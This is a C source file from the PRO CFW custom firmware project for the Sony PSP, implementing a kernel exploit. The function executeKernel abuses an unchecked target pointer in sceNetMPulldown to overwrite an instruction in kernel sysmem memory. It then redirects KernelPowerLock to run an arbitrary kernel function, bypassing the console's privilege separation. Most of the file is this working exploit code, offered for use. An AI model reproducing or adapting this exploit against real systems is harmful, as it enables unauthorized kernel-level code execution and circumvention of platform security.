/*
 * This file is part of PRO CFW.

 * PRO CFW is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * PRO CFW is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with PRO CFW. If not, see <http://www.gnu.org/licenses/ .
 */

#include <pspdebug.h>
#include <pspctrl.h>
#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psputility.h>
#include <psputility_htmlviewer.h>
#include <psploadexec.h>
#include <psputils.h>
#include <psputilsforkernel.h>
#include <pspsysmem.h>
#include <psppower.h>
#include <string.h>

#include "globals.h"
#include "functions.h"
#include "kxploit.h"

#define SYSMEM_TEXT_ADDR 0x88000000

struct MPulldownExploit;
int (* _sceNetMPulldown)(struct MPulldownExploit *data, int unk1, int unk2, int unk3);

struct MPulldownExploit {
	u32 *data; // unk_data
	int unk1; // should be 0
	void *target;
	int target_size;
	u32 unk_data[80]; // embeeded it
};

int stubScanner(){
	return 0;
}

void repairInstruction(void){
    //_sw(0x0040F809, 0x8800CB64);
    _sw(0x3C058801, 0x88000000+0x0000CBB8);
}

int doExploit(void){
    return 0;
}

void executeKernel(u32 kfuncaddr){
	struct MPulldownExploit *ptr;
	int ret;
	u32 kernel_entry, entry_addr;
	u32 interrupts;

	for (int i=0; i<7; i++) g_tbl->UtilityLoadModule(0x100+i);
	
	_sceNetMPulldown = g_tbl->FindImportUserRam("sceNetIfhandle_lib", 0xE80F00A4);
	
	ptr = (void*)0x00010000; // use scratchpad memory to bypass check at @sceNet_Service@+0x00002D80
	memset(ptr, 0, sizeof(*ptr));
	ptr->data = ptr->unk_data;
	ptr->target_size = 1;
	ptr->target = (void*)(SYSMEM_TEXT_ADDR + 0x0000CBB8 - ptr->target_size);

	ptr->data[2] = (u32)(ptr->data);
	ptr->data[3] = 4;
	ptr->data[4*4+3] = 1;

	// sceNetMCopydata didn't check ptr->target validation
	ret = _sceNetMPulldown(ptr, 0, 5, 0); // @sceNet_Service@+0x00003010
	
	g_tbl->KernelIcacheInvalidateAll();
	g_tbl->KernelDcacheWritebackAll();
	//interrupts = g_tbl->KernelCpuSuspendIntr();
	kernel_entry = kfuncaddr;
	entry_addr = ((u32) &kernel_entry) - 16;
	g_tbl->KernelPowerLock(0, ((u32) &entry_addr) - 0x000040F8);
	//g_tbl->KernelCpuResumeIntr(interrupts);

	for (int i=0; i<7; i++) g_tbl->UtilityUnloadModule(0x100+i);
}

